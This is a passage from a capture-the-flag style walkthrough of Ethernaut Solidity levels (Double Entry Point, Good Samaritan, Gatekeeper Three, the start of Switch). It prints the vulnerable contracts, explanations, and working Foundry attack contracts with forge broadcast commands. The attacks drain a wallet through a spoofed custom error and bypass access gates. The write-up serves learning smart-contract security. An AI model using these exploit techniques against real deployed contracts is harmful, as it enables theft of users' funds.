</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public</span><span>{
</span><span>        CryptoVault cv </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>CryptoVault</span><span>(cryptovault);
</span><span>
</span><span>        cv.</span><span style=color:#795da3;font-weight:700>sweepToken</span><span>(</span><span style=color:#795da3;font-weight:700>IERC20</span><span>(delegatedFrom));
</span><span>
</span><span>    }
</span><span>
</span><span>}
</span><span>
</span><span>contract DetectionBot{
</span><span>
</span><span>    DoubleEntryPoint public det </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>DoubleEntryPoint</span><span>(</span><span style=color:#0086b3>0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C</span><span>);
</span><span>    address public  cryptovault </span><span style=color:#a71d5d;font-weight:700>= </span><span>det.</span><span style=color:#795da3;font-weight:700>cryptoVault</span><span>();
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>handleTransaction</span><span>(address user, bytes calldata msgData) </span><span style=color:#795da3;font-weight:700>external </span><span>{
</span><span>        address origSender;
</span><span>
</span><span>        assembly {
</span><span>            origSender :</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>calldataload</span><span>(</span><span style=color:#0086b3>0xa8</span><span>)
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(origSender </span><span style=color:#a71d5d;font-weight:700>==</span><span>cryptovault ){
</span><span>            </span><span style=color:#795da3;font-weight:700>Forta</span><span>(msg.sender).</span><span style=color:#795da3;font-weight:700>raiseAlert</span><span>(user); </span><span style=color:#969896;font-style:italic>// raise alert of Forta contract
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/DoubleEntryPointSolve.s.sol:DoubleEntryPointSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=27-good-samaritan>27 Good Samaritan</h1><p><code>GoodSamaritan.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>>=</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0 </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span style=color:#0086b3>0.9</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"openzeppelin-contracts/contracts/utils/Address.sol"</span><span>;
</span><span>
</span><span>contract GoodSamaritan {
</span><span>    Wallet public wallet;
</span><span>    Coin public coin;
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>() {
</span><span>        wallet </span><span style=color:#a71d5d;font-weight:700>= new </span><span>Wallet();
</span><span>        coin </span><span style=color:#a71d5d;font-weight:700>= new </span><span>Coin(</span><span style=color:#795da3;font-weight:700>address</span><span>(wallet));
</span><span>
</span><span>        wallet.</span><span style=color:#795da3;font-weight:700>setCoin</span><span>(coin);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>requestDonation</span><span>() </span><span style=color:#795da3;font-weight:700>external returns</span><span>(bool enoughBalance){
</span><span>        </span><span style=color:#969896;font-style:italic>// donate 10 coins to requester
</span><span>        </span><span style=color:#a71d5d;font-weight:700>try </span><span>wallet.</span><span style=color:#795da3;font-weight:700>donate10</span><span>(msg.sender) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>catch </span><span>(bytes memory err) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#795da3;font-weight:700>keccak256</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodeWithSignature</span><span>(</span><span style=color:#183691>"NotEnoughBalance()"</span><span>)) </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#795da3;font-weight:700>keccak256</span><span>(err)) {
</span><span>                </span><span style=color:#969896;font-style:italic>// send the coins left
</span><span>                wallet.</span><span style=color:#795da3;font-weight:700>transferRemainder</span><span>(msg.sender);
</span><span>                </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>false</span><span>;
</span><span>            }
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Coin {
</span><span>    using Address for address;
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>mapping</span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>uint256) public balances;
</span><span>
</span><span>    error </span><span style=color:#795da3;font-weight:700>InsufficientBalance</span><span>(uint256 current, uint256 required);
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>(address wallet_) {
</span><span>        </span><span style=color:#969896;font-style:italic>// one million coins for Good Samaritan initially
</span><span>        balances[wallet_] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>10</span><span style=color:#a71d5d;font-weight:700>**</span><span style=color:#0086b3>6</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transfer</span><span>(address dest_, uint256 amount_) </span><span style=color:#795da3;font-weight:700>external </span><span>{
</span><span>        uint256 currentBalance </span><span style=color:#a71d5d;font-weight:700>= </span><span>balances[msg.sender];
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// transfer only occurs if balance is enough
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if</span><span>(amount_ </span><span style=color:#a71d5d;font-weight:700>&lt;= </span><span>currentBalance) {
</span><span>            balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>-= </span><span>amount_;
</span><span>            balances[dest_] </span><span style=color:#a71d5d;font-weight:700>+= </span><span>amount_;
</span><span>
</span><span>            </span><span style=color:#969896;font-style:italic>//if(dest_.isContract()) { 
</span><span>            </span><span style=color:#a71d5d;font-weight:700>if </span><span>(dest_.code.length </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>0</span><span>){
</span><span>                </span><span style=color:#969896;font-style:italic>// notify contract 
</span><span>                </span><span style=color:#795da3;font-weight:700>INotifyable</span><span>(dest_).</span><span style=color:#795da3;font-weight:700>notify</span><span>(amount_);
</span><span>            }
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            revert </span><span style=color:#795da3;font-weight:700>InsufficientBalance</span><span>(currentBalance, amount_);
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Wallet {
</span><span>    </span><span style=color:#969896;font-style:italic>// The owner of the wallet instance
</span><span>    address public owner;
</span><span>
</span><span>    Coin public coin;
</span><span>
</span><span>    error </span><span style=color:#795da3;font-weight:700>OnlyOwner</span><span>();
</span><span>    error </span><span style=color:#795da3;font-weight:700>NotEnoughBalance</span><span>();
</span><span>
</span><span>    modifier </span><span style=color:#795da3;font-weight:700>onlyOwner</span><span>() {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if</span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>!= </span><span>owner) {
</span><span>            revert </span><span style=color:#795da3;font-weight:700>OnlyOwner</span><span>();
</span><span>        }
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>() {
</span><span>        owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>donate10</span><span>(address dest_) </span><span style=color:#795da3;font-weight:700>external onlyOwner </span><span>{
</span><span>        </span><span style=color:#969896;font-style:italic>// check balance left
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(coin.</span><span style=color:#795da3;font-weight:700>balances</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this)) </span><span style=color:#a71d5d;font-weight:700>&lt; </span><span style=color:#0086b3>10</span><span>) {
</span><span>            revert </span><span style=color:#795da3;font-weight:700>NotEnoughBalance</span><span>();
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            </span><span style=color:#969896;font-style:italic>// donate 10 coins
</span><span>            coin.</span><span style=color:#795da3;font-weight:700>transfer</span><span>(dest_, </span><span style=color:#0086b3>10</span><span>);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transferRemainder</span><span>(address dest_) </span><span style=color:#795da3;font-weight:700>external onlyOwner </span><span>{
</span><span>        </span><span style=color:#969896;font-style:italic>// transfer balance left
</span><span>        coin.</span><span style=color:#795da3;font-weight:700>transfer</span><span>(dest_, coin.</span><span style=color:#795da3;font-weight:700>balances</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this)));
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setCoin</span><span>(Coin coin_) </span><span style=color:#795da3;font-weight:700>external onlyOwner </span><span>{
</span><span>        coin </span><span style=color:#a71d5d;font-weight:700>= </span><span>coin_;
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>interface </span><span>INotifyable {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>notify</span><span>(uint256 amount) </span><span style=color:#795da3;font-weight:700>external</span><span>;
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>Would you be able to drain all the balance from his Wallet?</ol><ul><li>Solution</ul><ol><li>There in total three contract are given to us. <code>GoodSamaritan</code> contract deployes <code>Wallet</code> and <code>Coin</code> contracts.<li>Good samaritan will be the <code>owner</code> of the <code>Wallet</code> contract. And the wallet contract will have 10**6 Coin balances.<li>We are given with the GoodSamaritan instance address. We can able to call the <code>requestDonation()</code> function to get 10 coins from the GoodSamaritan's Wallet.<li>One call to <code>requestDonation()</code> will get 10 coins only. To drain all the coins of the Wallet we need to call the <code>requestDonation()</code> function <code>100000</code> times which requires more gas.<li>Instead we can try to invoke the <code>withdrawRemainder()</code> function which will send all the coins at a time.<li>The <code>withdrawRemainder()</code> is called when the <code>wallet.donate10(msg.sender)</code> returns error <code>NotEnoughBalance()</code> defined inside Wallet contract.<li>GoodSamaritan contract expects the error from the Wallet contract only. But as per the solidity docs, the error may be raised and bubbled up by any intermediary contract. That means we cannot predict the origin of the error.<li>So, can we raise error by ourself to the GoodSamaritan..? yes, When transfering 10 coins to the sender inside the <code>Coin</code> contract it notifies the sender if the sender is a contract.<li>This means it calls to our <code>msg.sender</code>, now we can implement the <code>notify()</code> function inside our Attack contract and revert with the <code>NotEnoughBalance()</code> error when receiving the 10 coins.<li>We should revert the <code>NotEnoughBalance()</code> error when only receiving the 10 coins not when the GoodSamaritan sending whole coins.<li>For this I used the amount parameter sent by the Coin contract through the notify call.<li>Now GoodSamaritan gets the error <code>NotEnoughBalance()</code> when it sends 10 coins to us, immediately it will send whole coins to us.</ol><p><code>GoodSamaritanSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"../src/GoodSamaritan.sol"</span><span>;
</span><span>
</span><span>contract GoodSamaritanSolve is Script {
</span><span>    GoodSamaritan public gs </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>GoodSamaritan</span><span>(</span><span style=color:#0086b3>0x5887fc48Bd661cCD104998d3BB556b1879aC4cC2</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Wallet Address : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(gs.</span><span style=color:#795da3;font-weight:700>wallet</span><span>()));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Coin Address : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(gs.</span><span style=color:#795da3;font-weight:700>coin</span><span>()));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Balance of Wallet"</span><span>, gs.</span><span style=color:#795da3;font-weight:700>coin</span><span>().</span><span style=color:#795da3;font-weight:700>balances</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(gs.</span><span style=color:#795da3;font-weight:700>wallet</span><span>())));
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>new </span><span>Attack().</span><span style=color:#795da3;font-weight:700>exploit</span><span>();
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Balance of Wallet"</span><span>, gs.</span><span style=color:#795da3;font-weight:700>coin</span><span>().</span><span style=color:#795da3;font-weight:700>balances</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(gs.</span><span style=color:#795da3;font-weight:700>wallet</span><span>())));
</span><span>
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    error </span><span style=color:#795da3;font-weight:700>NotEnoughBalance</span><span>();
</span><span>    GoodSamaritan public gs </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>GoodSamaritan</span><span>(</span><span style=color:#0086b3>0x5887fc48Bd661cCD104998d3BB556b1879aC4cC2</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public</span><span>{
</span><span>        gs.</span><span style=color:#795da3;font-weight:700>requestDonation</span><span>();
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>notify</span><span>(uint256 amount) </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if</span><span>(amount </span><span style=color:#a71d5d;font-weight:700>&lt;= </span><span style=color:#0086b3>10</span><span>){ </span><span style=color:#969896;font-style:italic>// only revert when receiving 10 coins
</span><span>            revert </span><span style=color:#795da3;font-weight:700>NotEnoughBalance</span><span>();
</span><span>        }
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/GoodSamaritanSolve.s.sol:GoodSamaritanSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=28-gatekeeper-three>28 Gatekeeper Three</h1><p><code>GatekeeperThree.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract SimpleTrick {
</span><span>  GatekeeperThree public target;
</span><span>  address public trick;
</span><span>  uint private password </span><span style=color:#a71d5d;font-weight:700>= </span><span>block.timestamp;
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor </span><span>(address payable _target) {
</span><span>    target </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>GatekeeperThree</span><span>(_target);
</span><span>  }
</span><span>    
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>checkPassword</span><span>(uint _password) </span><span style=color:#795da3;font-weight:700>public returns </span><span>(bool) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(_password </span><span style=color:#a71d5d;font-weight:700>== </span><span>password) {
</span><span>      </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>    }
</span><span>    password </span><span style=color:#a71d5d;font-weight:700>= </span><span>block.timestamp;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>false</span><span>;
</span><span>  }
</span><span>    
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>trickInit</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    trick </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(this);
</span><span>  }
</span><span>    
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>trickyTrick</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this) </span><span style=color:#a71d5d;font-weight:700>== </span><span>msg.sender </span><span style=color:#a71d5d;font-weight:700>&& </span><span style=color:#795da3;font-weight:700>address</span><span>(this) </span><span style=color:#a71d5d;font-weight:700>!= </span><span>trick) {
</span><span>      target.</span><span style=color:#795da3;font-weight:700>getAllowance</span><span>(password);
</span><span>    }
</span><span>  }
</span><span>}
</span><span>
</span><span>contract GatekeeperThree {
</span><span>  address public owner;
</span><span>  address public entrant;
</span><span>  bool public allowEntrance;
</span><span>
</span><span>  SimpleTrick public trick;
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>construct0r</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>      owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#795da3;font-weight:700>gateOne</span><span>() {
</span><span>    </span><span style=color:#62a35c>require</span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span>owner);
</span><span>    </span><span style=color:#62a35c>require</span><span>(tx.origin </span><span style=color:#a71d5d;font-weight:700>!= </span><span>owner);
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#795da3;font-weight:700>gateTwo</span><span>() {
</span><span>    </span><span style=color:#62a35c>require</span><span>(allowEntrance </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>true</span><span>);
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#795da3;font-weight:700>gateThree</span><span>() {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this).balance </span><span style=color:#a71d5d;font-weight:700>> </span><span style=color:#0086b3>0.001 </span><span>ether </span><span style=color:#a71d5d;font-weight:700>&& </span><span style=color:#795da3;font-weight:700>payable</span><span>(owner).</span><span style=color:#62a35c>send</span><span>(</span><span style=color:#0086b3>0.001 </span><span>ether) </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>false</span><span>) {
</span><span>      _;
</span><span>    }
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getAllowance</span><span>(uint _password) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(trick.</span><span style=color:#795da3;font-weight:700>checkPassword</span><span>(_password)) {
</span><span>        allowEntrance </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>    }
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>createTrick</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    trick </span><span style=color:#a71d5d;font-weight:700>= new </span><span>SimpleTrick(</span><span style=color:#795da3;font-weight:700>payable</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this)));
</span><span>    trick.</span><span style=color:#795da3;font-weight:700>trickInit</span><span>();
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>enter</span><span>() </span><span style=color:#795da3;font-weight:700>public gateOne gateTwo gateThree </span><span>{
</span><span>    entrant </span><span style=color:#a71d5d;font-weight:700>= </span><span>tx.origin;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>receive </span><span>() external payable {}
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>Cope with gates and become an entrant.</ol><ul><li>Solution</ul><ol><li>Similar to GatekeeperOne and GatekeeperTwo we need to pass the three gate checks by the modifiers when calling the <code>enter()</code> function.<li><code>gateOne()</code> can be bypassed if we are the owner of the contract and we need call from a contract.<li>To be be the owner we can call the <code>construct0r()</code> function its not the actual constructor(), so we can be the owner after calling it.<li><code>gateTwo()</code> will be passed if we managed to change the <code>allowEntrance</code> value to true. To do it, we need to call the <code>getAllowance()</code> function with the right password defined inside SimpleTrick contract.<li>So, we need to deploy a SimpleTrick contract first, we can do this by calling <code>createTrick()</code> function.<li>After that we need to find the password stored inside SimpleTrick contract. We can do this by using <code>vm.load</code> cheatcode or we can find the password inside our Attack contract.<li>Because the password is the <code>block.timestamp</code> which will be same during a transaction. If we deploy the SimpeToken and get the block.timestamp inside same call, the block.timestamp will be the password for us.<li>Callling <code>getAllowance()</code> with this value will pass the gateTwo.<li>For <code>gateThree()</code> the balance of the GatekeeperThree should be greater than 0.001 ether and when the GatekeeperThree sends 0.001 ether to owner it should return false.<li>Remember owner is out attack contract, GatekeeperThree sending ether using <code>send</code> call. <code>send</code> call will return <code>false</code> when the transaction fails.<li>So, we have to deny the ether sent by the GatekeeperThree. To do this, I haven't implemented any fallback or receive function inside my Attack contract.<li>For this reason the send will return false to GatekeeperThree contract and now we will able to register as entrant.</ol><p><code>GatekeeperThreeSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"../src/GatekeeperThree.sol"</span><span>;
</span><span>
</span><span>contract GatekeeperThreeSolve is Script {
</span><span>    GatekeeperThree public gate </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>GatekeeperThree</span><span>(</span><span style=color:#795da3;font-weight:700>payable</span><span>(</span><span style=color:#0086b3>0x152e56fe5FEC16f910Ea83294dD321a0c8380193</span><span>));
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Gate Owner : "</span><span>, gate.</span><span style=color:#795da3;font-weight:700>owner</span><span>());
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// address trick = gate.trick().trick();
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("Trick Address : ", trick);
</span><span>        </span><span style=color:#969896;font-style:italic>// bytes32 _password = vm.load(trick, bytes32(uint(2)));
</span><span>        </span><span style=color:#969896;font-style:italic>// uint password = uint(_password);
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("Password : ", password);
</span><span>
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span>Attack{value</span><span style=color:#a71d5d;font-weight:700>: </span><span style=color:#0086b3>0.002 </span><span>ether}();
</span><span>        attack.</span><span style=color:#795da3;font-weight:700>exploit</span><span>();
</span><span>        
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Allow Entrance : "</span><span>, gate.</span><span style=color:#795da3;font-weight:700>allowEntrance</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Gate Owner : "</span><span>, gate.</span><span style=color:#795da3;font-weight:700>owner</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Entrant : "</span><span>, gate.</span><span style=color:#795da3;font-weight:700>entrant</span><span>());
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    GatekeeperThree public gate </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>GatekeeperThree</span><span>(</span><span style=color:#795da3;font-weight:700>payable</span><span>(</span><span style=color:#0086b3>0x152e56fe5FEC16f910Ea83294dD321a0c8380193</span><span>));
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>() payable{}
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        gate.</span><span style=color:#795da3;font-weight:700>construct0r</span><span>();
</span><span>
</span><span>        gate.</span><span style=color:#795da3;font-weight:700>createTrick</span><span>();
</span><span>        gate.</span><span style=color:#795da3;font-weight:700>getAllowance</span><span>(block.timestamp);
</span><span>
</span><span>        (bool success, ) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>payable</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(gate)).call{value : </span><span style=color:#795da3;font-weight:700>address</span><span>(this).balance}(</span><span style=color:#183691>""</span><span>);
</span><span>        </span><span style=color:#62a35c>require</span><span>(success, </span><span style=color:#183691>"Tx Failed"</span><span>);
</span><span>
</span><span>        gate.</span><span style=color:#795da3;font-weight:700>enter</span><span>();
</span><span>
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/GatekeeperThreeSolve.s.sol:GatekeeperThreeSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=29-switch>29 Switch</h1><p><code>Switch.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract Switch {
</span><span>    bool public switchOn; </span><span style=color:#969896;font-style:italic>// switch is off
</span><span>    bytes4 public offSelector </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>bytes4</span><span>(</span><span style=color:#795da3;font-weight:700>keccak256</span><span>(</span><span style=color:#183691>"turnSwitchOff()"</span><span>));
</span><span>
</span><span>     modifier </span><span style=color:#795da3;font-weight:700>onlyThis</span><span>() {
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#795da3;font-weight:700>address</span><span>(this), </span><span style=color:#183691>"Only the contract can call this"</span><span>);
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    modifier </span><span style=color:#795da3;font-weight:700>onlyOff</span><span>() {
</span><span>        </span><span style=color:#969896;font-style:italic>// we use a complex data type to put in memory
</span><span>        bytes32[</span><span style=color:#0086b3>1</span><span>] memory selector;
</span><span>        </span><span style=color:#969896;font-style:italic>// check that the calldata at position 68 (location of _data)
</span><span>        assembly {
</span><span>            </span><span style=color:#795da3;font-weight:700>calldatacopy</span><span>(selector, </span><span style=color:#0086b3>68</span><span>, </span><span style=color:#0086b3>4</span><span>) </span><span style=color:#969896;font-style:italic>// grab function selector from calldata
</span><span>        }
</span><span>        </span><span style=color:#62a35c>require</span><span>(
